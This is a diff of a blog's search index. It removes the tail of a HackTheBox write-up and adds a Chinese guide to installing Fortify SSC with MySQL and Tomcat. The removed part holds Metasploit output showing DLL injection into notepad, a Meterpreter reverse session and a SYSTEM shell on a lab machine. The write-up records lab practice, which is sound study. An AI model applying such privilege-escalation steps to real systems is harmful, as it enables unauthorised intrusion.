present, Windows Version detected: Windows Server 2019</span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[*] The notepad path is: C:\Windows\System32\notepad.exe</span><br><span class="line">[*] The notepad pid is: 4628</span><br><span class="line">[*] Reflectively injecting the DLL into 4628...</span><br><span class="line">[*] Sending stage (203846 bytes) to 10.10.10.180</span><br><span class="line">[*] Meterpreter session 4 opened (10.10.16.30:7777 -&gt; 10.10.10.180:49703) at 2025-02-23 23:26:34 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th align="left">Flag</th>
-<th align="left">Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Flag1</td>
-<td align="left">C:\Users\Public\Desktop\user.txt</td>
+<td>default_storage_engine</td>
+<td>INNODB</td>
 </tr>
 <tr>
-<td align="left">Flag2</td>
-<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
+<td>innodb_buffer_pool_size</td>
+<td>512M</td>
+</tr>
+<tr>
+<td>innodb_lock_wait_timeout</td>
+<td>300</td>
+</tr>
+<tr>
+<td>innodb_log_file_size</td>
+<td>512M</td>
+</tr>
+<tr>
+<td>max_allowed_packetv</td>
+<td>1G</td>
+</tr>
+<tr>
+<td>sql-mode</td>
+<td>“TRADITIONAL”</td>
 </tr>
 </tbody></table>
-]]></content>
+<p>保存配置，命令行重启服务（要管理员权限）</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-4.png" class="" title="重启mysql服务">
+
+<h4 id="导入官方提供的SQL脚本"><a href="#导入官方提供的SQL脚本" class="headerlink" title="导入官方提供的SQL脚本"></a>导入官方提供的SQL脚本</h4><p>新建数据库并导入SQL脚本：数据库字符集设置为<code>utf8\\uft8\_bin</code></p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-5.png" class="" title="新建数据库">
+
+
+
+<p>禁用安全模式,然后重新连接数据库</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-6.png" class="" title="禁用安全模式">
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-7.png" class="" title="导入sql脚本">
+
+<h4 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h4><p>使用安装版安装Tomcat，选择full</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-8.png" class="" title="tomcat">
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-9.png" class="" title="tomcat">
+
+<h4 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h4><p>清空webapps目录，并放入ssc.war</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-10.png" class="" title="webapps">
+<p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-11.png" class="">
+<style>.kmbimqpruafi{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="kmbimqpruafi" alt="修改配置">
+<style>.bwvbwkfuicgv{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="bwvbwkfuicgv">
+
+<h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <a href="http://127.0.0.1:8080/ssc/">http://127.0.0.1:8080/ssc/</a></p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-14.png" class="" title="访问SSC">
+
+<p>打开上面配置的那个fortify home的路径，有个init.token文件，复制内容贴进去</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-15.png" class="" title="获取token">
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-16.png" class="" title="登录">
+
+<p>上传License</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-17.png" class="" title="上传许可证">
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-18.png" class="" title="默认配置">
+
+
+
+<p>配置数据</p>
+<p><code>jdbc:mysql://ip:3306/sscsessionVariables=collation_connection=utf8_bin&amp;rewriteBatchedStatements=true</code></p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-19.png" class="" title="配置数据库">
+
+<p>上传种子包，需要按顺序上传</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-20.png" class="" title="upload seed">
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-21.png" class="" title="上传成功">
+
+<p>重启Tomcat</p>
+<img src="/DevSecOps/tools/fortifyssc/DraggedImage-22.png" class="" title="重启服务">]]></content>
       <categories>
-        <category>Hackthebox</category>
+        <category>DevSecOps</category>
       </categories>
       <tags>
-        <tag>CVE</tag>
-        <tag>信息收集</tag>
+        <tag>企业安全建设</tag>
+        <tag>DevSecOps</tag>
+        <tag>工具</tag>
       </tags>
   </entry>
 </search>
